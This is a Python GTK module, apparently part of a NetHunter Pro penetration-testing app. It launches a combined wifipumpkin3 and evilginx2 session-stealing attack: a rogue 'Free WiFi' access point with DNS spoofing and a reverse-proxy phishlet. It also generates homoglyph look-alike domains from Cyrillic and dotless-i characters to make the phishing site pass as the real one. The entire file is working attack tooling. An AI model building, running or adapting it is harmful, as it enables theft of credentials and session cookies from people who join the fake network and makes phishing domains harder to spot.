"""wifipumpkin3 + evilginx2 (phishkin3): pick a phishlet, a look-alike domain,
and launch the whole attack.

The manual setup is many steps -- evilginx config, phishlet, lure, /etc/hosts,
a wp3 .pulp with DNS spoof and the phishkin3 proxy, both tools in the right
order. rhodep-phishkin3-launch does all of that; this screen picks the three
inputs and calls it.

The domain is never the real one (HSTS preload refuses a spoof of the real
name). The screen suggests look-alikes: a plain one and homoglyphs -- Cyrillic
and dotless-i characters that read as the original but are a different domain,
converted to punycode by the launcher.
"""
from __future__ import annotations

import os

from gi.repository import Adw, GLib, Gtk

from ..executor import Result, run_async, which
from ..module import NHModule, register
from ..widgets import ToolRunner, toast

PHISHLETS_DIR = "/usr/share/evilginx2/phishlets"
LAUNCHER = "/usr/libexec/nethunter-pro-phishkin3-launch"

# Homoglyph substitutions: a character that reads as the key but is a different
# codepoint, so the domain is not the real one.
HOMOGLYPHS = {
    "a": "\u0430",  # Cyrillic a
    "e": "\u0435",  # Cyrillic e
    "o": "\u043e",  # Cyrillic o
    "i": "\u0456",  # Cyrillic dotted i (or dotless below)
    "c": "\u0441",  # Cyrillic c
    "p": "\u0440",  # Cyrillic p
    "x": "\u0445",  # Cyrillic x
}


def homoglyph_variants(base):
    """A few look-alike domains for a base like 'instagram.com'.

    Each swaps one class of character, so they stay readable rather than turning
    into noise. Returns the plain look-alike first, then homoglyphs.
    """
    name, _, tld = base.partition(".")
    tld = tld or "com"
    out = []
    # a plain, obviously-typed look-alike
    out.append("%s-login.%s" % (name, tld))
    # single-character homoglyph swaps, first occurrence of each letter
    for plain, glyph in HOMOGLYPHS.items():
        if plain in name:
            out.append((name.replace(plain, glyph, 1)) + "." + tld)
    # a dotless-i variant if there is an i
    if "i" in name:
        out.append(name.replace("i", "\u0131", 1) + "." + tld)
    # de-dup preserving order
    seen, ordered = set(), []
    for d in out:
        if d not in seen:
            seen.add(d)
            ordered.append(d)
    return ordered


@register
class Phishkin3(NHModule):
    title = "Phishkin3 (evilginx)"
    icon = "network-wireless-hotspot-symbolic"
    description = "wifipumpkin3 + evilginx2 session-stealing attack"
    required_tools = ["wifipumpkin3", "evilginx2"]

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        g = Adw.PreferencesGroup(
            title="Attack",
            description="Pick a phishlet and a look-alike domain. Needs a "
            "phishlet in /usr/share/evilginx2/phishlets and an AP-capable "
            "adapter.")

        self.phishlet = Adw.ComboRow(title="Phishlet")
        self.phishlet_model = Gtk.StringList()
        self.phishlet.set_model(self.phishlet_model)
        self.phishlet.connect("notify::selected", self._on_phishlet)
        g.add(self.phishlet)

        self.ssid = Adw.EntryRow(title="AP name (SSID)")
        self.ssid.set_text("Free WiFi")
        g.add(self.ssid)

        self.iface = Adw.EntryRow(title="AP interface")
        self.iface.set_text("wlan1")
        g.add(self.iface)

        # The adapter with internet, shared to the AP's clients so the victim
        # gets online after logging in (and evilginx can reach the real site).
        self.iface_net = Adw.EntryRow(title="Internet interface (share to victim)")
        self.iface_net.set_text("wlan0")
        g.add(self.iface_net)

        # Suggested look-alike domains, plus a free field.
        self.domain_combo = Adw.ComboRow(title="Look-alike domain")
        self.domain_model = Gtk.StringList()
        self.domain_combo.set_model(self.domain_model)
        self.domain_combo.connect("notify::selected", self._on_domain_pick)
        g.add(self.domain_combo)

        self.domain_entry = Adw.EntryRow(title="…or type your own domain")
        g.add(self.domain_entry)
        box.append(g)

        actions = Adw.PreferencesGroup()
        dry = Adw.ActionRow(
            title="Dry run",
            subtitle="Set up evilginx and show the lure URL, launch nothing")
        db = Gtk.Button(label="Dry run", valign=Gtk.Align.CENTER)
        db.connect("clicked", lambda _b: self._launch(start=False))
        dry.add_suffix(db)
        actions.add(dry)

        go = Adw.ActionRow(
            title="Launch attack",
            subtitle="Start the AP, DNS spoof, phishkin3 and evilginx")
        gb = Gtk.Button(label="Launch", valign=Gtk.Align.CENTER)
        gb.add_css_class("destructive-action")
        gb.connect("clicked", lambda _b: self._launch(start=True))
        go.add_suffix(gb)
        actions.add(go)

        stop = Adw.ActionRow(title="Stop attack",
                             subtitle="Kill wp3 and evilginx, restore hosts")
        sb = Gtk.Button(label="Stop", valign=Gtk.Align.CENTER)
        sb.connect("clicked", lambda _b: self._stop())
        stop.add_suffix(sb)
        actions.add(stop)
        box.append(actions)

        self.runner = ToolRunner()
        box.append(self.runner)

        self._load_phishlets()
        return box

    def _load_phishlets(self) -> None:
        def done(r: Result) -> None:
            while self.phishlet_model.get_n_items() > 0:
                self.phishlet_model.remove(0)
            names = sorted(
                n[:-5] for n in (r.stdout or "").split() if n.endswith(".yaml"))
            for n in names:
                self.phishlet_model.append(n)
            if names:
                self._on_phishlet(None, None)
        run_async(["sh", "-c", "ls -1 %s 2>/dev/null" % PHISHLETS_DIR],
                  done, timeout=10)

    def _on_phishlet(self, _row, _p) -> None:
        # Guess a base domain from the phishlet name and offer look-alikes.
        idx = self.phishlet.get_selected()
        item = self.phishlet_model.get_item(idx)
        if not item:
            return
        name = item.get_string()
        base = "%s.com" % name.replace("_", "").replace("-", "")
        variants = homoglyph_variants(base)
        while self.domain_model.get_n_items() > 0:
            self.domain_model.remove(0)
        for d in variants:
            self.domain_model.append(d)
        if variants:
            self.domain_combo.set_selected(0)
            self.domain_entry.set_text(variants[0])

    def _on_domain_pick(self, _row, _p) -> None:
        idx = self.domain_combo.get_selected()
        item = self.domain_model.get_item(idx)
        if item:
            self.domain_entry.set_text(item.get_string())

    def _launch(self, start: bool) -> None:
        idx = self.phishlet.get_selected()
        item = self.phishlet_model.get_item(idx)
        if not item:
            toast(self.app_window, "No phishlet selected -- add one to %s"
                  % PHISHLETS_DIR)
            return
        phishlet = item.get_string()
        domain = self.domain_entry.get_text().strip()
        iface = self.iface.get_text().strip() or "wlan1"
        iface_net = self.iface_net.get_text().strip()
        ssid = self.ssid.get_text().strip()
        if not domain:
            toast(self.app_window, "Pick or type a look-alike domain")
            return
        argv = [LAUNCHER, "--phishlet", phishlet, "--domain", domain,
                "--interface", iface]
        if ssid:
            argv += ["--ssid", ssid]
        if iface_net:
            argv += ["--interface-net", iface_net]
        if start:
            argv.append("--start")
        self.runner.output.append(
            "%s phishkin3: %s on %s via %s\n"
            % ("Launching" if start else "Dry-run", phishlet, domain, iface))
        self.runner.run(argv, root=True)

    def _stop(self) -> None:
        # Kill everything, drop the tmux session, strip our hosts entries, and
        # give the AP interface back to NetworkManager so ordinary Wi-Fi still
        # works on it once the attack is done.
        iface = self.iface.get_text().strip() or "wlan1"
        # Stop uses the same narrow-pattern approach as the launcher: 'pkill -f
        # phishkin3' would match nethunter-pro-phishkin3-launch itself, and
        # although this runs in a different shell than the launcher, the same
        # trap can catch anything else on the machine that happens to have
        # 'phishkin3' in its name. Match the real service processes.
        script = (
            "tmux kill-session -t phishkin3 2>/dev/null || true\n"
            "pgrep -f 'wifipumpkin3 -p' | xargs -r kill -9 2>/dev/null || true\n"
            "pgrep -f 'plugins/bin/phishkin3' | xargs -r kill -9 2>/dev/null || true\n"
            "pkill -9 -x evilginx2 2>/dev/null || true\n"
            "pkill -9 -x hostapd 2>/dev/null || true\n"
            "pkill -9 -x dnsmasq 2>/dev/null || true\n"
            "iptables -F FORWARD 2>/dev/null || true\n"
            "iptables -t nat -F 2>/dev/null || true\n"
            "sed -i '/# nethunter-phishkin3/d' /etc/hosts 2>/dev/null || true\n"
            "nmcli device set %s managed yes 2>/dev/null || true\n"
            "echo stopped, hosts restored, %s back to NetworkManager\n"
        ) % (iface, iface)
        self.runner.output.append("Stopping phishkin3…\n")
        self.runner.run(["sh", "-c", script], root=True)
